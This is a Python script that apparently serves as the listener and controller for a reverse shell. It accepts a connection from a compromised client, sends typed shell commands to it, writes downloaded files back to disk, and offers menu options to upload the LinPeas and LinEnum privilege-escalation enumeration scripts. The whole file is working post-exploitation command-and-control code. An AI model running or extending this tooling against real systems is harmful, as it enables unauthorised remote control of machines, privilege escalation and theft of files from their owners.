#!/usr/bin/python3

#########################################################################################
#   Simple server ... almost
#########################################################################################

import socket
import json
import base64

S_IP = "192.168.0.13"
S_PORT = 9091


class ServerN1F:
    def __init__(self, ip, port):
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server.bind((ip, port))
        server.listen(1)
        print("[+] Waiting for connections")
        self.conn, addr = server.accept()
        print(f"[+] Client connected  {str(addr)}")

#   ##################################   MENU
        print("[+] 0 : basic info")
        print("[+] 1 : upload LinPeas")
        print("[+] 2 : upload LinEnum")
        print("\n")
#   ##################################


#   #####################################################################################
#   JSON serialization ...

    def reliable_send(self, data):
        json_data = json.dumps(data)
        print(f"[+] Command:    {data} \ttype:  {type(data)}")
        self.conn.sendall(bytes(json_data, encoding="utf-8"))

    def reliable_recv(self):
        json_data = self.conn.recv(8000)
        return json.loads(json_data)
#   #####################################################################################

    def write_file(self, path, content):
        with open(path, "wb") as file:
            #content = bytes(content, encoding="utf-8")
            content = base64.b64decode(content)
            try:
                file.write(content)
                #print(content)
            except:
                print("[+] Server ERROR")
            return f"[+] Download completed."

    def execute_command(self, command):
        #print(command[0])
        self.reliable_send(command)
        if command[0] == "qq":
            self.conn.close()
            exit()
        resp = self.reliable_recv()
        return resp

    def run_server(self):
        while True:
            command = input("$ ")
            command = command.split(" ")
            result = self.execute_command(command)
            if command[0] == "download":
                result = self.write_file(command[1], result)
            print(result)

if __name__ == "__main__":
    s = ServerN1F(S_IP, S_PORT)
    s.run_server()
